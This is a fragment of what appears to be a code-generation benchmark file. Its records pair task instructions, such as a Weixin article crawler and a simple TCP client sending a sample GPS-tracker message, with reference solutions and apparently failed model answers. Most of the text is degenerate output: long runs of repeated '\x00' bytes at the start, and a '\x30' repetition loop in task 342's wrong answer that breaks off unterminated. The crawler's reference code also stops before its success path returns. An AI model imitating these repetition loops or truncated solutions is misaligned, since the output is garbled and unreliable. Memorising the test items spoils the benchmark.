x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
  },
  {
    "Task_id": 34,
    "Instruction": "Task Description: Create a function to crawl content from Weixin Official Account Platform (mp.weixin.qq.com) URLs using HTTP requests with proper error handling and logging.\n\nFunction Description: The function mp_crawler takes a URL and a logger object as input, validates the URL, makes an HTTPS request to the Weixin Official Account Platform, and returns a status code along with response data (empty in case of errors). It includes URL validation, HTTP request handling with timeout, and proper error logging.\n\nInput:\n- url: str - The target URL to crawl (must be from mp.weixin.qq.com domain)\n- logger: logging.Logger - Logger object for recording warnings and errors\n\nOutput:\n- Tuple[int, dict] - Returns a tuple containing:\n  - First element: int status code (-5 for invalid URL, -7 for request failure, or HTTP status code for success)\n  - Second element: dict containing response data (empty dict in case of errors)",
    "Canonical_solution": "import httpx\nfrom bs4 import BeautifulSoup\nfrom datetime import datetime\nimport re\n\nheader = {\n    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/604.1 Edg/112.0.100.0'}\n\ndef mp_crawler(url: str, logger) -> (int, dict):\n    if not url.startswith('https://mp.weixin.qq.com') and not url.startswith('http://mp.weixin.qq.com'):\n        logger.warning(f'{url} is not a mp url, you should not use this function')\n        return -5, {}\n\n    url = url.replace(\"http://\", \"https://\", 1)\n\n    try:\n        with httpx.Client() as client:\n            response = client.get(url, headers=header, timeout=30)\n    except Exception as e:\n        logger.warning(f\"cannot get content from {url}\\n{e}\")\n        return -7, {}",
    "Code_level": "Function-level",
    "FSMID_for_test": 58,
    "wrong_result": "import requests\nimport re\nimport logging\n\ndef mp_crawler(url: str, logger: logging.Logger) -> tuple[int, dict]:\n    # Validate URL\n    if not url.startswith('https://') or not re.match(r'^https://mp\\.weixin\\.qq\\.com/.+$', url):\n        logger.warning(f\"Invalid URL: {url}\")\n        return (-5, {})\n\n    try:\n        response = requests.get(url, timeout=10)\n        response.raise_for_status()\n        return (response.status_code, response.json())\n    except requests.RequestException as e:\n        logger.error(f\"Request failed for {url}: {str(e)}\")\n        return (-7, {})"
  },
  {
    "Task_id": 342,
    "Instruction": "Task Description: Create a Python function that establishes a TCP client connection to a server, sends a message, and continuously receives responses from the server.\n\nFunction Description: The function `tcp_client_communication` creates a TCP socket, connects to a specified server, sends a predefined or custom message, and enters a loop to continuously receive and print responses from the server until manually interrupted. The connection is closed after the loop exits (though in practice, the loop is infinite and `s.close()` may not be reached).\n\nInput:\n- `host` (str, optional): The IP address or hostname of the target server. Defaults to \"localhost\".\n- `port` (int, optional): The port number of the target server. Defaults to 5001.\n- `message` (bytes, optional): The message to send to the server. Defaults to a predefined GPS tracker message in bytes format.\n\nOutput: None (The function prints received data to the console but does not return any value).",
    "Canonical_solution": "import socket\nimport binascii\n\ndef tcp_client_communication(host=\"localhost\", port=5001, message=b\"imei:123456789012345,tracker,151030080103,,F,000101.000,A,5443.3834,N,02512.9071,E,0.00,0;\"):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((host, port))\n    s.send(message)\n    \n    while True:\n        print(s.recv(1024))\n    \n    s.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "def tcp_client_communication(host=\"localhost\", port=5001, message=b\"\\x47\\x50\\x53\\x20\\x31\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\